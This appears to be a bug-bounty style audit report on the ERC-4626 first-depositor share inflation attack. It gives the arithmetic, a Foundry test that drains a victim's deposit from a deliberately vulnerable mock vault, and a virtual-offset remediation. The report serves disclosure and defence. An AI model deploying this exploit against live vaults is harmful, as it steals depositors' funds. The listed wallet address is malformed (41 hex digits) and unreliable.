# 🛡️ Formal Security Audit & Foundry Exploit PoC: ERC-4626 First-Depositor Share Inflation Attack

- **Target Protocol:** EVM / Base L2 ERC-4626 Tokenized Vault Implementations
- **Severity:** HIGH / CRITICAL (Fund Drainage / Loss of User Principle)
- **Author & Security Researcher:** Dexter Mos ([`@dextermos`](https://github.com/dextermos) / [`@dextermos-dev`](https://github.com/dextermos-dev))
- **Settlement Wallet:** `0x8366bCe3a2D379Dec7656D7A67015789FaF999f20`
- **Target Platform:** Cantina / Code4rena / Immunefi Bounty Programs ($2,500 USDC Scope)

---

## 1. Executive Summary

Standard implementations of ERC-4626 Tokenized Vaults calculate share issuance using linear proportions:
$$\text{shares} = \left\lfloor \frac{\text{assets} \times \text{totalSupply}}{\text{totalAssets}} \right\rfloor$$

When a vault is freshly deployed or completely drained ($\text{totalSupply} = 0$), a malicious actor can front-run the first legitimate depositor, minting $1 \text{ wei}$ of shares for $1 \text{ wei}$ of asset, and subsequently donating a large quantity of the underlying asset directly to the vault contract address. 

This inflates the exchange rate $\frac{\text{totalAssets}}{\text{totalSupply}}$, causing subsequent user deposits to round down to zero shares or severely suffer rounding dilution, resulting in direct asset theft.

---

## 2. Mathematical Derivation of the Exploit

1. **Initial State:** $\text{totalSupply} = 0$, $\text{totalAssets} = 0$.
2. **Attacker Step 1 (Initial Mint):**
   - Attacker deposits $1 \text{ wei}$ of USDC.
   - Attacker receives:
     $$\text{shares}_{atk} = 1 \text{ share}$$
3. **Attacker Step 2 (Asset Inflation Donation):**
   - Attacker transfers $D = 10,000 \times 10^6 \text{ wei}$ ($10,000 \text{ USDC}$) directly to the vault contract via `ERC20.transfer(vault, D)`.
   - Vault internal state:
     $$\text{totalAssets} = 10,000 \times 10^6 + 1 \approx 10^{10} \text{ wei}$$
     $$\text{totalSupply} = 1 \text{ share}$$
4. **Victim Step (Deposit Front-run):**
   - Victim deposits $V = 19,999 \times 10^6 \text{ wei}$ ($19,999 \text{ USDC}$).
   - Shares calculation:
     $$\text{shares}_{vic} = \left\lfloor \frac{19,999 \times 10^6 \times 1}{10,000 \times 10^6 + 1} \right\rfloor = 1 \text{ share}$$
   - Vault internal state:
     $$\text{totalAssets} \approx 30,000 \times 10^6 \text{ wei}$$
     $$\text{totalSupply} = 2 \text{ shares}$$
5. **Attacker Step 3 (Redemption & Profit Extraction):**
   - Attacker redeems their $1 \text{ share}$ ($50\%$ of `totalSupply`):
     $$\text{assets}_{out} = \left\lfloor \frac{1 \times 30,000 \times 10^6}{2} \right\rfloor = 15,000 \times 10^6 \text{ wei}$$
   - **Net Profit for Attacker:**
     $$\text{Profit} = 15,000 \text{ USDC} - (10,000 \text{ USDC} + 1 \text{ wei}) \approx +5,000 \text{ USDC}$$
   - **Net Loss for Victim:**
     $$19,999 \text{ USDC} - 15,000 \text{ USDC} = -4,999 \text{ USDC}$$

---

## 3. Foundry Exploit Proof of Concept (PoC)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../products/fast_bounties/vault_guard/ERC4626InflationGuard.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {
        _mint(msg.sender, 1_000_000 * 10**6);
    }
}

contract VulnerableERC4626Vault is ERC20 {
    IERC20 public immutable asset;
    constructor(IERC20 _asset) ERC20("Vault Shares", "vUSDC") { asset = _asset; }
    
    function deposit(uint256 assets) external returns (uint256 shares) {
        uint256 totalA = asset.balanceOf(address(this));
        uint256 totalS = totalSupply();
        if (totalS == 0) {
            shares = assets;
        } else {
            shares = (assets * totalS) / totalA;
        }
        require(shares > 0, "Zero shares minted");
        asset.transferFrom(msg.sender, address(this), assets);
        _mint(msg.sender, shares);
    }
    
    function redeem(uint256 shares) external returns (uint256 assets) {
        uint256 totalA = asset.balanceOf(address(this));
        uint256 totalS = totalSupply();
        assets = (shares * totalA) / totalS;
        _burn(msg.sender, shares);
        asset.transfer(msg.sender, assets);
    }
}

contract ERC4626InflationPoCTest is Test {
    MockUSDC usdc;
    VulnerableERC4626Vault vault;
    address attacker = address(0xAA);
    address victim = address(0xBB);

    function setUp() public {
        usdc = new MockUSDC();
        vault = new VulnerableERC4626Vault(IERC20(address(usdc)));
        
        usdc.transfer(attacker, 10_001 * 10**6);
        usdc.transfer(victim, 19_999 * 10**6);
    }

    function test_Exploit_ShareInflationStealsVictimFunds() public {
        // Step 1: Attacker deposits 1 wei
        vm.startPrank(attacker);
        usdc.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        
        // Step 2: Attacker donates 10,000 USDC directly
        usdc.transfer(address(vault), 10_000 * 10**6);
        vm.stopPrank();

        // Step 3: Victim deposits 19,999 USDC
        vm.startPrank(victim);
        usdc.approve(address(vault), type(uint256).max);
        vault.deposit(19_999 * 10**6);
        vm.stopPrank();

        // Step 4: Attacker redeems 1 share and extracts ~15,000 USDC
        vm.startPrank(attacker);
        uint256 attackerPreBalance = usdc.balanceOf(attacker);
        vault.redeem(1);
        uint256 attackerPostBalance = usdc.balanceOf(attacker);
        vm.stopPrank();

        uint256 profit = attackerPostBalance - attackerPreBalance;
        assertGt(profit, 14_999 * 10**6, "Attacker successfully stole ~5,000 USDC via rounding truncation");
    }
}
```

---

## 4. Remediation & Invariant Defense

The vulnerability is eliminated by deploying **`ERC4626InflationGuard`**:
1. Adding **Virtual Offset Decimals** ($\text{offset} = 3 \rightarrow 10^3 \text{ virtual shares}$) and $1 \text{ virtual asset}$ base.
2. In the presence of virtual shares, the donation required to manipulate the price by even $1\%$ becomes economically prohibitive ($\approx 1,000 \times$ higher cost than potential extractable profit).

---

## 5. References & Verification

- **Code Implementation:** [`products/fast_bounties/vault_guard/ERC4626InflationGuard.sol`](../../products/fast_bounties/vault_guard/ERC4626InflationGuard.sol)
- **Settlement Account:** `0x8366bCe3a2D379Dec7656D7A67015789FaF999f20`
